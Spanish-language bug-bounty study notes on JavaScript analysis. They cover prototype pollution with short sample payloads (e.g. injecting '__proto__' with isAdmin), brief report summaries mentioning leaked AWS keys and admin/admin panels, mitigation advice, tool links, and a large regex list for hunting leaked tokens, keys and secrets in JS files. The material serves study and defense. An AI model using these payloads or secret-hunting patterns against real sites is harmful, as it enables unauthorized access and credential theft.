La contaminación de prototipos suele ocurrir mediante objetos profundamente anidados o funciones de fusión de objetos , donde una aplicación gestiona incorrectamente la entrada del usuario. Si un atacante logra pasar información maliciosa a una función que fusiona o extiende objetos, puede modificar el prototipo global del objeto.

Así es como funciona un ataque típico:

Apunta a una función vulnerable : La contaminación de prototipos suele surgir en código que utiliza bibliotecas o métodos para fusionar objetos, como la función lodashde _.merge()o jQuery extend(). Estas funciones pueden tomar la entrada del usuario y fusionarla con objetos existentes.
Inyección de entrada maliciosa : El atacante inyecta información que hace referencia a la cadena de prototipos. Por ejemplo, al enviar la carga útil {"__proto__": {"isAdmin": true}}, puede modificar el objeto prototipo.
Aprovechar la contaminación : una vez contaminado el prototipo, el atacante puede aprovechar el comportamiento modificado para aumentar privilegios, alterar la lógica de la aplicación o activar omisiones de seguridad.
Ejemplo de prototipo de ataque de contaminación
Considere una aplicación que fusiona la entrada del usuario en su objeto de configuración utilizando una función de biblioteca:

función mergeSettings(userInput) { 
  Object.assign(configuración, userInput); 
}
mergeSettings({ "__proto__": { "isAdmin": verdadero } });
Después de ejecutar este código, el objeto prototipo global ( Object.prototype) se contamina y cualquier objeto ahora tendrá una isAdminpropiedad:

dejar usuario = {}; 
consola . log (usuario. isAdmin );   // verdadero
En una aplicación del mundo real, esto podría conducir a una escalada de privilegios, donde un atacante sin privilegios administrativos podría eludir los controles de acceso.

Técnicas avanzadas de explotación de la contaminación de prototipos
Más allá de la simple inyección de propiedades, la contaminación de prototipos puede conducir a ataques más sofisticados:

1. Ejecución de código mediante contaminación de prototipos
En algunos casos, la contaminación de prototipos puede provocar la ejecución remota de código (RCE) . Esto ocurre cuando las propiedades contaminadas se utilizan posteriormente para controlar el comportamiento de las funciones o los valores que devuelven. Al inyectar valores específicos en los prototipos, los atacantes pueden controlar el flujo de la aplicación, lo que podría provocar la ejecución de código arbitrario.


Por ejemplo, si una aplicación evalúa posteriormente propiedades controladas por el usuario dentro de una función vulnerable, el atacante podría desencadenar comportamientos peligrosos.

2. Ataques de denegación de servicio (DoS)
La contaminación de prototipos también puede provocar el colapso de una aplicación o servidor al contaminar el prototipo con objetos grandes o circulares. Esto genera agotamiento de memoria o bucles infinitos que dejan el sistema inoperante. Por ejemplo, inyectar objetos profundamente anidados en el prototipo podría causar un uso excesivo de memoria:

deje que la carga útil = { "__proto__" : { "anidado" : { "nivel1" : { "nivel2" : { "nivel3" : {...}}}}}};
3. Encadenamiento con otras vulnerabilidades
En aplicaciones web complejas, la contaminación de prototipos puede combinarse con otras vulnerabilidades para aumentar su impacto. Por ejemplo, si un atacante puede inyectar scripts maliciosos mediante secuencias de comandos entre sitios (XSS) o modificar las respuestas de la API mediante controles de acceso deficientes, la contaminación de prototipos puede utilizarse para escalar el ataque o mantener el comportamiento malicioso en varias sesiones.

Ejemplo real de contaminación prototípica
Se descubrió un caso notable de contaminación de prototipos en lodash , una popular biblioteca de utilidades de JavaScript. La vulnerabilidad existía en sus funciones _.defaultsDeepy _.merge, lo que permitía la fusión de objetos, incluyendo la entrada del usuario, sin filtrar adecuadamente las propiedades del prototipo. Los atacantes podrían crear una carga útil maliciosa:

_ .merge ({}, JSON.parse ( ' {"__proto__": {"contaminado": "sí"}}' ));
Esto contaminó el global Object.prototype, lo que generó problemas de seguridad para las aplicaciones que utilizan versiones vulnerables de lodash. Esta vulnerabilidad fue finalmente corregida, pero puso de relieve el riesgo generalizado que la contaminación de prototipos supone para las aplicaciones JavaScript.

Prevención de la contaminación por prototipos
Para evitar la contaminación de prototipos se requiere una validación de entrada minuciosa y un manejo seguro de los objetos dentro del código JavaScript. A continuación, se presentan algunas estrategias clave:

Evitar la modificación directa de __proto__, constructor, yprototype : Bloquear o sanear la entrada del usuario que haga referencia a las propiedades __proto__, constructoro prototype. Por ejemplo:
if (userInput.hasOwnProperty('__proto__')) { throw new Error("Prototype pollution detected!"); }
Use bibliotecas seguras : Asegúrese de que todas las bibliotecas o el código de terceros que utilice estén actualizados y parcheados contra vulnerabilidades de contaminación de prototipos. Compruebe si existen vulnerabilidades conocidas en bibliotecas como lodash o jQuery.
Utilice Object.create() para la creación de instancias de objetos : al crear objetos nuevos, utilice Object.create(null)para crear objetos sin prototipos, evitando que la herencia de prototipos altere la lógica de la aplicación.
Implementar congelación profunda de objetos : bloquee objetos usando métodos como Object.freeze()o Object.seal()para evitar modificaciones adicionales:
Object.freeze(safeObject);
Realizar validación de entrada : siempre valide y desinfecte la entrada del usuario para asegurarse de que no incluya propiedades peligrosas que puedan modificar el comportamiento de la aplicación.
Al final…
La contaminación de prototipos es una vulnerabilidad potente que explota el sistema de herencia de objetos inherente a JavaScript. Al inyectar propiedades en los prototipos de objetos, los atacantes pueden manipular el comportamiento de las aplicaciones, eludir los controles de seguridad y potencialmente escalar el ataque a consecuencias más graves, como la ejecución de código o la denegación de servicio.

Dado el uso generalizado de JavaScript en las aplicaciones web modernas, comprender y defenderse contra la contaminación de prototipos es crucial tanto para desarrolladores como para profesionales de la seguridad. Mediante una validación de entrada estricta, la protección de bibliotecas y la gestión adecuada de la creación de objetos, puede proteger sus aplicaciones de este complejo y peligroso vector de ataque.
mhe nada interesante.
interesante con comillas simples o doble / pudo escapar cerrar la codificacion para lograr xss.
nada
Interesante resulta que el sitio web mandaba todo cifrado resulta que la logica de eso dejaron en front lo encontro y bueno lo aplico y logro obtener una clave de AWS S3.
Impacto de la contaminación de los prototipos🏹
El atacante puede introducir bucles infinitos en el código que provocarían un gran consumo de recursos.
La contaminación del prototipo del lado del cliente puede convertirse en la causa de XSS DOM, mientras que en el lado del servidor también puede causar RCE.
Corrompe el comportamiento del objeto, lo que puede provocar una exposición inesperada de datos confidenciales o eludir el mecanismo de seguridad implementado.
nada interesante.
nada interesante algunas tools etc.
nada
nada interesante.
nada
Este maldito informe me ayudo a comprender realmente la diferencia entre usar ripgrep con diccionario y reglas regex vs jsluice y el lenjuage de consulta etc super bueno lo potenciare con unas 70 cateogiras y unas 150 reglas regex etc muy bueno para analisis mas completo y detalle.


Concepto base
Herramienta	Qué hace realmente
ripgrep + regex	Busca textos que coincidan con un patrón (sin entender el lenguaje). Opera sobre bytes.
jsluice / Tree-Sitter	“Parsea” el código con un árbol sintáctico (AST) real. Entiende qué es función, variable, string, objeto, etc. Opera sobre estructura gramatical, no sobre texto plano.
2. Diferencia práctica

ripgrep/regex:

Encuentra “function” o “const”, pero no sabe si está en un comentario o en una string.

Si el código está minificado, comprimido o con saltos raros, se rompe.

Ejemplo: te devuelve 100 falsos positivos si hay “function” dentro de comentarios o docstrings.

jsluice/Tree-Sitter:

Lee el parse tree.
Ejemplo: (function_declaration name: (identifier) @fn) literalmente te devuelve solo los nombres de función definidos, sin importar el formato, espaciado o minificación.

Entiende contextos, evita falsos positivos.

Funciona igual con async, export, class, arrow functions, etc.

Puede extraer relaciones: “todas las funciones que llaman a fetch” o “todas las asignaciones a window.location”.

3. Cuándo usar cada uno

Ripgrep + regex:

Escaneo masivo rápido de keywords sospechosas (tokens, endpoints, secretos).

Pre-filtrado en millones de archivos (tu pipeline clásico).

Contexto: “necesito 10 posibles candidatos en segundos”.

Tree-Sitter / jsluice:

Análisis estructural.
Ideal cuando querés entender qué hace el código, no solo qué texto contiene.
Ejemplos reales:

Mapear llamadas a fetch, axios, XMLHttpRequest.

Identificar todas las funciones que manipulan document.cookie.

Encontrar dónde se usan APIs críticas (localStorage, eval, innerHTML, etc.).

Extraer rutas o nombres de handlers sin falsos positivos.
el informe mas corto de js analsis jaja buscar control f admin contraseña la probo y entro.
comprendi con este informe que los puntos finales puede aceptar varios metodos http si no estan definidos.
nada una tool de un loco pero nada interesante.
Si encuentra un UUID de usuario filtrado en algún lugar, busque los puntos finales que lo utilizan y use su búsqueda Burp para facilitar el proceso.
super interesante y complejo malware de js interesante el proceso incial como termina.
nada interesante.
ip de origen admin admin en ambos campos panel etc. alto bounty.
tremendo reversing de js pudo subir un webshell encima 2 jaja super bueno explicado y algo complejo si no tenes el conocimientos suficiente para poder identificar algo asi en js y demas, esta bueno.
esta bueno como es el pensamiento de los hunter ante un sitio web solo un panel interesante analisis de js siempre te da pan solo tienes que comertelo XD.
eludir los controles de seguridad de JavaScript explotando su característica de tipado débil.

cambiando el valor === etc mirar el informe.
js Comparación y condiciones, interesante

Comparación
En ese texto, explicaremos muchas más comparaciones. Como en todos los lenguajes de programación, JavaScript también compara dos valores con ==;

10 == 10;

Este valor nos dará verdadero. Porque los valores de la izquierda (10) y la derecha (10) son iguales.

Lo mismo que las cuerdas;

“hola” == “hola” ; nos dará verdadero

Pero “hola” == “Hola” nos dará falso, porque javascript distingue entre mayúsculas y minúsculas.

En nuestro segundo texto, hablamos del polimorfismo. Ahora veremos algunos ejemplos de este problema.

10 == “10” ; ¿debería dar falso o verdadero?

Es verdadero porque hay polimorfismo y las cadenas tienen precedencia, por lo que JavaScript toma el valor entero izquierdo y cambia su tipo de dato y lo compara con el valor de la cadena derecha.
js  Incrustar objetos y matrices
Búsqueda de contaminación de prototipos del lado del cliente
Bueno para este tipo de caza vamos a utilizar Chrome/Chromium ya que cuentan con las Developer Tools que seguro son más compatibles para la depuración.

La explotación comienza determinando si el sitio web es vulnerable a la contaminación del prototipo del lado del cliente. Usaremos ppmap , que probará automáticamente diferentes cargas útiles para contaminar las variables en el contexto global. Después de descargar la herramienta en su equipo local, simplemente ejecútela en el sitio web de destino con el siguiente comando:
Este artículo te ayudará a profundizar en el tema de la contaminación de prototipos. En las secciones "Características de JavaScript" y "Qué es la contaminación de prototipos", aprenderás cómo funcionan los objetos y prototipos de JavaScript y cómo sus características específicas pueden generar vulnerabilidades. En las secciones " Contaminación de prototipos del lado del cliente" y "Contaminación de prototipos del lado del servidor", aprenderás a buscar y explotar esta vulnerabilidad en casos reales. Finalmente, aprenderás a proteger tus aplicaciones y por qué el método de protección más común se puede eludir fácilmente.


<br><br>



<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>


### <picture> <img src = "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3J4cGg3dm5randjOW03ODJqMzBhcXo4aGV0bHY3aXpya3g1bXhwNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/mgQYcSomO5vbt7A9Cl/giphy.gif" width = 80px>  </picture> Hardening / mitigation 

#  7

**En esta sección encontraremos cómo mitigar las vulnerabilidades asociadas al análisis de JavaScript.**
<br><br>


- Mitigaciones clave (prácticas inmediatas)<br><br>

- Eliminar eval, new Function, setTimeout(string). Reemplazar por parsers/sandboxed templates.<br><br>

- Contextual encoding/escaping: HTML encode para HTML, JS encode para datos dentro de scripts, URL-encode para parámetros.<br><br>

- CSP estricta + SRI en scripts externos + bloquear inline scripts cuando sea posible.<br><br>

- No almacenar secretos en frontend; mover a backend / vault. Escanear repos por secrets y rotarlos.<br><br>

- Auditar y fijar versiones de dependencias (SCA), revisar changelogs y aplicar parches.<br><br>

- Validar Origin/Referer en WebSockets/postMessage; configurar CORS restricto.<br><br>

- Protección contra prototype pollution: limpiar keys (denylist __proto__, constructor, prototype), evitar merges inseguros.<br><br>

- Sanitizar entradas antes de renderizar en el DOM; preferir APIs seguras (textContent, setAttribute con valores seguros) ,  utilizar DOMPurify.

- No exponer tokens, paths internos ni subdominios no listados

- No exponer API keys ni credenciales en el frontend.

- No publicar rutas internas ni subdominios que no formen parte del scope público.
   
- Eliminar o bloquear funciones de debug y lógica sensible en el cliente.

- No confiar en validaciones del lado cliente: validar siempre en el backend.

- Mantener separación clara entre lo que puede ejecutarse/mostrarse en el navegador y lo que solo debe procesarse en el servidor.

- No utilizar parámetros vulnerables para open redirect; en caso de necesidad, aplicar lista blanca y reglas regex en el WAF.

- Cuidar la lógica para evitar inyección de plantillas.

-  Protección contra parámetros prototype.

-  Si le interesa profundizar en la protección frente al análisis de JavaScript y las vulnerabilidades que se pueden encontrar, le recomiendo revisar mis notas personales y los informes.




<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzhwcjVwbmRsazd6cTh3M3l2cmh1eTIxYmh3YmF6Yzk3c2ZuZzBvMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/uRoZBofy2cTCvz18we/giphy.gif" width = 80px>  </picture> “Recursos img entre otros”

#  8

**En esta sección encontrarás imágenes, recursos adicionales, herramientas y mucho más, todo relacionado con el análisis de JavaScript.**
<br><br>

## IMG


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251023-092744.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251025-133825.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-134719.png"/>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-141930.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-143940.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-150204.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-150212.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-150219.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-150419.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-153145.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-155123.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-155913.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-161537.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-221442.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-221528.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-221729.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-224251.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-224614.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-232001.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251026-232056.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251027-003902.png"/>

<br><br>



<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251027-004753.png"/>

<br><br>



<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251027-004853.png"/>

<br><br>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251028-112615.png"/>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251022-235403.png"/>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251023-005230.png"/>


<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251023-075353.png"/>

<br><br>

<br><br>

<img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/js_analisis/blob/main/assets/img/swappy-20251023-082626.png"/>



<br><br>

## Recursos

https://www.youtube.com/watch?v=VpDmOjDqmh8
 — Interesante metodología bastante completa de análisis de JS con sus tools.<br><br>
https://www.youtube.com/watch?v=djCNhYMo3eE
 — Está bueno, habla sobre análisis de JS y análisis de diferentes cosas como React, Angular, etc. También trata algo básico de regex, pero está bien.<br><br>
https://www.youtube.com/watch?v=CiIyaZ3x49c
 — Súper bueno, reglas regex; explica cómo funciona la lógica según la biblioteca, muy interesante.<br><br>
https://www.youtube.com/watch?v=AIZh0MDk3lI
 — Bueno para mirar, en español (audio), cursito.<br><br>
https://blogs.jsmon.sh/100-regex-patterns/
 — Recurso interesante: más de 100 regex para análisis de JS.<br><br>
https://www.youtube.com/watch?v=ArwTbZAlZSA
 — Ocultar source.map.<br><br>
https://www.youtube.com/watch?v=FIYkjjFYvoI
 — Bueno para mirar, explica qué es source.map; interesante compilación sobre TypeScript y los compiladores de Vite, etc.<br><br>
https://www.youtube.com/watch?v=SkUcO4ML5U0
 — Uso de DevTools para análisis completo de source.map, cómo ocultarlo, limitaciones, etc.<br><br>
https://www.youtube.com/watch?v=qWDwHRZfbDo
 — Cómo funciona realmente source.map con Webpack, muy interesante.<br><br>
https://www.youtube.com/watch?v=uzRbPp4rC4M
 — Decodificación de VLQ para source.map, súper recomendado; incluye herramienta web.<br><br>
 https://www.youtube.com/watch?v=oVcv3QZiXNM Super recomendado sobre Análisis en profundidad de los mapas de origen - Nicolò Ribaudo | JSHeroes 2024


<br><br>

## Tools

https://urlquery.net/
 — Mirar endpoints interesantes, muy buen sitio web.<br><br>
https://obf-io.deobfuscate.io/
 — Para JS ofuscado, excelente sitio web.<br><br>
https://sokra.github.io/source-map-visualization/
 — Sitio web para analizar archivos source.map.<br><br>
https://regex101.com/
 — Interesante para probar reglas regex, permite test unitarios y varía según lenguaje o biblioteca. Súper útil.<br><br>
https://www.youtube.com/watch?v=AIZh0MDk3lI&list=PLFF93FRoUwXF-Lq9Bm55osmcg2dZrythY
 — Curso de 10 lecciones sobre regex, muy bueno.<br><br>
https://es.scribd.com/document/775345095/JavaScript-for-Hackers
 — Libro JavaScript for Hackers de Gareth Heyes, altamente recomendado (gratuito).<br><br>
https://cyscan.io/
 — Sitio web para escaneo rápido con captura de scripts, estilos, etc.<br><br>
https://github.com/0xacb/recollapse
 — Tool regex muy interesante.<br><br>
https://sploitus.com/?query=React#exploits
 — Interesante sitio web para buscar exploits relacionados con React.<br><br>

<br><br>


## Las tools que armé son 4:

1- Script de más de 150 reglas regex diferentes y con su categoría correspondiente.<br><br>


```yaml



API keys / Tokens / Servicios

(?:\s|=|:|"|^)AKC[a-zA-Z0-9]{10,}

(?:\s|=|:|"|^)AP[\dABCDEF][a-zA-Z0-9]{8,}

basic [a-zA-Z0-9_\\-:\\.=]+

bearer [a-zA-Z0-9_\\-\\.=]+

(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}

amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}

(?i)aws(.{0,20})?(?-i)['\"][0-9a-zA-Z\/+]{40}['\"]

(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?

(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[a-zA-Z0-9+/]+={0,2}

(?<=:\/\/)[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+

cloudinary:\/\/[0-9]{15}:[0-9A-Za-z]+@[a-z]+

EAACEdEose0cBA[0-9A-Za-z]+

(?i)(facebook|fb)(.{0,20})?['\"][0-9]{13,17}

(?i)(facebook|fb)(.{0,20})?['\"][0-9a-f]{32}

(?i)github(.{0,20})?(?-i)['\"][0-9a-zA-Z]{35,40}

ghp_[0-9a-zA-Z]{36}

github_pat_[0-9a-zA-Z_]{20,}

gho_[A-Za-z0-9]{36}

ghs_[A-Za-z0-9]{36}

ghu_[A-Za-z0-9]{36}

AIza[0-9A-Za-z\\-_]{35}

[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com

ya29\\.[0-9A-Za-z\\-_]+

(?i)(google|gcp|youtube|drive|yt)(.{0,20})?['\"][AIza[0-9a-z\\-_]{35}]['\"]

[hH]eroku['\"][0-9a-f]{32}['\"]

\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}\b

(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))

(?:const|let|var)\s+\K(\w+?)(?=[;.=\s])

(?i)linkedin(.{0,20})?(?-i)['\"][0-9a-z]{12}['\"]

(?i)linkedin(.{0,20})?['\"][0-9a-z]{16}['\"]

[0-9a-f]{32}-us[0-9]{1,2}

key-[0-9a-zA-Z]{32}

(?<=mailto:)[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+

[a-f0-9]{32}

sk_live_[0-9a-z]{32}

xox[baprs]-([0-9a-zA-Z]{10,48})?

https://hooks.slack.com/services/T[a-zA-Z0-9_]{10}/B[a-zA-Z0-9_]{10}/[a-zA-Z0-9_]{24}

(pk|sk|rk)_(test|live)_[A-Za-z0-9]+

sqOatp-[0-9A-Za-z\\-_]{22}

sq0csp-[ 0-9A-Za-z\\-_]{43}

SK[0-9a-fA-F]{32}

(?i)twitter(.{0,20})?['\"][0-9a-z]{18,25}

[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]

(?i)twitter(.{0,20})?['\"][0-9a-z]{35,44}

[sb]\.[a-zA-Z0-9]{24}

(?<=\?|\&)[a-zA-Z0-9_]+(?=\=)

\b(?:sessionid|sess|session_token|session_key|sessid|sid)\b

\b(?:session|sess)_[A-Za-z0-9\-_.]{8,64}\b

\b[Ss]ession[A-Za-z0-9_\-]{8,64}\b

\b[A-Za-z0-9-_]{10,}\.[A-Za-z0-9-_]{10,}\.[A-Za-z0-9-_]{10,}\b

\brefresh_token\b|\brefresh-token\b|\brefreshToken\b

\bsession_token=[A-Za-z0-9\-_.%]{8,}\b






URLs, DB URIs, infra

https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)

[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)

mongodb(\+srv)?:\/\/[^\s'"]+

postgres(?:ql)?:\/\/[^\s'"]+

mysql:\/\/[^\s'"]+

redis:\/\/[^\s'"]+

elasticsearch:\/\/[^\s'"]+

supabase\.co\/[a-z0-9]{15,}

https:\/\/[a-z0-9-]+\.firebaseio\.com

jdbc:\w+:\/\/[^\s'"]+

[a-z0-9-]+\.rds\.amazonaws\.com

googleapis\.com\/sql\/v1beta4\/projects\/






Servicios, SDKs y otros tokens

(?i)(algolia|application)_?key['"\s:=]+[a-zA-Z0-9]{10,}

firebaseConfig\s*=\s*{[^}]*apiKey\s*:\s*['"][^'"]+['"]

cloudinary:\/\/[0-9]{15}:[a-zA-Z0-9]+@[a-zA-Z]+

https:\/\/[a-zA-Z0-9]+@[a-z]+\.ingest\.sentry\.io\/\d+

netlifyAuthToken\s*=\s*['"][a-z0-9]{40}['"]

[a-f0-9]{40}

(?i)segment(.{0,20})?key['"\s:=]+[a-zA-Z0-9]{10,}

(?i)intercom(.{0,20})?token['"\s:=]+[a-zA-Z0-9-_]{20,}

apiKey['"]?\s*:\s*['"][a-z0-9\-]{32,64}['"]

plaid(.{0,20})?(client)?secret['"\s:=]+[a-z0-9-_]{30,}

(?i)docker(.{0,20})?password['"\s:=]+[^\s'"]{8,}

arn:aws:iam::[0-9]{12}:role\/[A-Za-z0-9_+=,.@\-_/]+

s3:\/\/[a-z0-9\-\.]{3,63}

(?i)secretName:\s*['"]?[a-z0-9\-]+['"]?

(?i)secret\s*:\s*['"][^'"]+['"]

secrets\.[A-Z0-9_]+

encrypted_value:\s*['"][a-zA-Z0-9+/=]{10,}['"]

eyJhbGciOiJSUzI1NiIsImtpZCI6

s\.[a-zA-Z0-9]{8,}

https:\/\/vault\.[a-z0-9\-_\.]+\.com

(?i)\baws_secret_access_key\b|\bsecret_access_key\b

(?i)AccountKey=[A-Za-z0-9+/=]{20,}

(?i)DefaultEndpointsProtocol=https;AccountName=

\b(?:s\.[A-Za-z0-9\-_]{20,}|vault_token)\b








CI/CD / DevOps

circle-token=[a-z0-9]{40}

(?i)travis(.{0,20})?token['"\s:=]+[a-z0-9]{30,}

Jenkins-Crumb:\s*[a-z0-9]{30,}

[a-z0-9]{52}

ghp_[a-zA-Z0-9]{36}

glpat-[0-9a-zA-Z-_]{20}

bitbucket(.{0,20})?key['"\s:=]+[a-zA-Z0-9]{20,}

bitbucket(.{0,20})?secret['"\s:=]+[a-zA-Z0-9]{20,}

glrt-[a-zA-Z0-9_-]{20}

netlifyAuthToken\s*=\s*['"][a-z0-9]{40}['"] (mantener una sola forma si querés)

SDKs / Telemetría / Analítica

[a-f0-9]{32} (Bugsnag style)

[a-z0-9]{32} (Datadog-like)

[a-z0-9]{30}-[a-z0-9]{10}

NRII-[a-zA-Z0-9]{20,}

(?i)mixpanel(.{0,20})?token['"\s:=]+[a-z0-9]{32}

heapSettings\.appId\s*=\s*['"][a-z0-9]{8,12}['"]

projectId['"]?\s*:\s*['"][a-f0-9]{24}['"]

writeKey['"]?\s*:\s*['"][a-zA-Z0-9]{64}['"]

snyk_token\s*=\s*[a-f0-9\-]{36}

access_token['"]?\s*:\s*['"][a-z0-9]{32}['"]







Juegos / Plataformas / Bots

(?i)twitch(.{0,20})?key['"\s:=]+[a-zA-Z0-9]{20,}

[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}

https:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[a-zA-Z0-9_-]+

(?i)steam(.{0,20})?key['"\s:=]+[a-zA-Z0-9]{32}

RGAPI-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}

sl\.[A-Za-z0-9_-]{20,100}

shpat_[0-9a-fA-F]{32}




URLs/Endpoints internos y fuga

\b(10\.\d{1,3}|\b192\.168|\b172\.(1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}

localhost:[0-9]{2,5}

(dev|staging|test)\.[a-z0-9.-]+\.(com|net|io)

https?:\/\/[a-z0-9.-]+\.internal\.[a-z]{2,}

https:\/\/preprod\.[a-z0-9-]+\.[a-z]{2,}






Privadas / PEM / PGP / blocks

-----BEGIN (RSA|DSA|EC|OPENSSH)? PRIVATE KEY-----

-----BEGIN CERTIFICATE-----

-----BEGIN PGP PRIVATE KEY BLOCK-----

['\"][A-Za-z0-9+\/]{40,}={0,2}['\"]

(?i)(apikey|api_key|secret|token)['"\s:=]+[a-zA-Z0-9\-._]{8,}

(?i)authorization:\s*Bearer\s+[a-zA-Z0-9\-._~+/]+=*

(?i)(sessionid|session_id)['"\s:=]+[a-zA-Z0-9]{10,}

(?i)set-cookie:\s*[a-zA-Z0-9_-]+=

(?i)csrf(token)?['"\s:=]+[a-zA-Z0-9-_]{8,}

localStorage\.setItem\(['"]token['"],\s*['"]eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+['"]\)





Generales útiles / alta entropía

['\"][A-Za-z0-9+\/]{40,}={0,2}['\"]

